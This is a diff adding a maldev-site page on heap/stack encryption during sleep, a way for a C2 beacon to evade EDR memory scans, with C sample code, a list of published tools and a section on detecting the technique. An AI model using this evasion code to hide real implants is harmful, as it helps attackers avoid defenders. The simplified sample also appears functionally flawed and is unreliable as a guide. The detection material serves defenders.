@@ -1,0 +1,185 @@
+---
+title: Heap / Stack Encryption During Sleep
+mitre: T1027.007
+category: evasion
+group: Memory Obfuscation
+summary: Encrypt the beacon's own memory while it sleeps so in-sleep memory scans find nothing recognisable.
+platform: [Windows]
+tags: ['C / C++', 'x64', 'ROP']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: register a VEH or use a timer to wake before sleep ends
+    desc: Need a mechanism to decrypt and resume before the next check-in.
+    dll: kernel32
+  - call: encrypt own .text / heap / config regions
+    desc: XOR or AES-encrypt the beacon image sections and configuration blob in place.
+    dll: —
+  - call: change page protection to PAGE_NOACCESS or PAGE_READONLY
+    desc: Remove execute permission so a scan of RX memory finds nothing — the region is now inaccessible.
+    dll: kernel32
+  - call: SleepEx (alertable) or WaitForSingleObjectEx
+    desc: Wait in an alertable state for the sleep duration.
+    dll: kernel32
+  - call: decrypt and restore permissions on wake
+    desc: Restore page protections and decrypt the regions before executing any payload code.
+    dll: kernel32
+detections:
+  - src: ETW-TI
+    text: VirtualProtect removing execute permission from a previously RX region that contains known beacon patterns.
+  - src: MEMORY SCAN
+    text: Scanning during the sleep window finds high-entropy non-executable memory where RX memory was before sleep.
+  - src: BEHAVIOURAL
+    text: A process that alternates between having RX private memory and high-entropy non-executable private memory on a regular interval.
+  - src: YARA
+    text: Timing the scan to wake events — scanning immediately after a process becomes CPU-active catches the decrypted window.
+related:
+  - mitre: T1027.007
+    title: Sleep Obfuscation
+    desc: The parent technique — Ekko, Foliage, and Cronos are published implementations.
+    href: /techniques/evasion/sleep-obfuscation
+  - mitre: T1106
+    title: Direct Syscalls
+    desc: Use NtProtectVirtualMemory directly so the VirtualProtect hook doesn't log the protection change.
+    href: /techniques/evasion/direct-syscalls
+  - mitre: T1027.009
+    title: Encrypted Shellcode Loader
+    desc: Encryption before execution; heap encryption is encryption between executions.
+    href: /techniques/loaders/shellcode-loader
+labKit:
+  - label: heap_enc.c (Ekko-inspired)
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Most C2 beacons spend the vast majority of their lifetime sleeping between check-ins. During
+sleep, memory scanners can trivially find the beacon's .text section, configuration block, and
+heap allocations using YARA signatures. Heap encryption (often called "sleep obfuscation") solves
+this by encrypting the beacon's own memory before sleeping and decrypting it before resuming.
+
+The key insight is that memory scanners operating at the OS level only see what is currently
+mapped and readable. If the beacon's pages are encrypted and marked PAGE_NOACCESS during sleep,
+a scan triggered while the beacon sleeps produces no hits.
+
+<Callout type="caution">
+  The decryption window — the moment between waking and completing decryption — is still
+  scannable. EDR products that scan on `VirtualProtect` events (specifically the restore of
+  execute permissions) catch the beacon in the act of waking up. The window is microseconds, but
+  a scanner triggered on that ETW event will catch it.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+A simplified version of the Ekko-style sleep obfuscation using `RtlCreateTimer` and
+`RtlCaptureContext` to execute the encrypt/decrypt routine from a timer callback:
+
+<CodeBlock
+  file="heap_enc.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+#include <wincrypt.h>
+#pragma comment(lib, "advapi32.lib")
+
+extern BYTE  _payload_start[];   // start of .text section
+extern DWORD _payload_size;      // size of .text section
+
+static BYTE  g_key[16]  = {0};   // random key generated at load time
+static BOOL  g_sleeping = FALSE;
+
+// XOR-encrypt/decrypt the beacon's own image in place
+static void xor_image(void) {
+    for (DWORD i = 0; i < _payload_size; i++)
+        _payload_start[i] ^= g_key[i % 16];
+}
+
+static VOID CALLBACK wake_apc(ULONG_PTR arg) {
+    (void)arg;
+    // 1. Restore RX permissions
+    DWORD old;
+    VirtualProtect(_payload_start, _payload_size,
+                   PAGE_EXECUTE_READ, &old);
+    // 2. Decrypt
+    xor_image();
+    g_sleeping = FALSE;
+}
+
+void obfuscated_sleep(DWORD ms) {
+    // Generate a fresh key for this sleep
+    HCRYPTPROV prov;
+    CryptAcquireContextA(&prov, NULL, NULL, PROV_RSA_FULL,
+                         CRYPT_VERIFYCONTEXT);
+    CryptGenRandom(prov, 16, g_key);
+    CryptReleaseContext(prov, 0);
+
+    // Encrypt our image
+    DWORD old;
+    xor_image();
+    // Remove execute permission — scanner sees non-executable encrypted data
+    VirtualProtect(_payload_start, _payload_size,
+                   PAGE_READWRITE, &old);
+
+    g_sleeping = TRUE;
+
+    // Queue an APC to ourselves to wake and decrypt after 'ms' ms
+    // (simplified — real implementations use RtlCreateTimer or a timer thread)
+    HANDLE ev = CreateEventW(NULL, FALSE, FALSE, NULL);
+    QueueUserAPC(wake_apc, GetCurrentThread(), 0);
+    SleepEx(ms, TRUE);   // alertable sleep — drains APC on wake
+
+    // If we reach here, wake_apc has already run and restored the image
+    CloseHandle(ev);
+}`}
+/>
+
+## Published implementations
+
+| Name | Mechanism | Key feature |
+|---|---|---|
+| Ekko | ROP + `RtlCreateTimer` + `SystemFunction032` | AES via `SystemFunction032`, ROP for VirtualProtect call |
+| Foliage | `NtContinue` ROP chain | Avoids direct VirtualProtect calls; stack spoofing |
+| Cronos | CFG-compliant ROP | Works on binaries with CFG enforced |
+| Popstar | `NtQueueApcThread` self-APC | Similar to the simplified version above |
+
+Each implementation uses progressively more sophisticated techniques to avoid the VirtualProtect
+event being correlated with the encrypt/decrypt sequence.
+
+## The timer-based approach (Ekko style)
+
+Instead of using an APC, Ekko builds a chain of `RtlCreateTimer` callbacks:
+
+1. Timer 1: encrypt image + change protection to RW
+2. Timer 2: `SleepEx` in an alertable thread for the sleep duration
+3. Timer 3: change protection back to RX + decrypt image
+
+This splits the sequence across multiple timer callbacks, making the ETW correlation harder
+because the VirtualProtect events are separated in time and appear in different callback frames.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The strongest detection approach is to scan memory on a fixed interval from outside the
+process — a kernel driver or an EDR component that schedules periodic scans regardless of
+what the process is doing. A beacon that is encrypted during sleep will show high-entropy
+private memory where RX memory was during its active window. That alternating pattern, correlated
+with process CPU activity, is a reliable indicator of sleep obfuscation in use.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
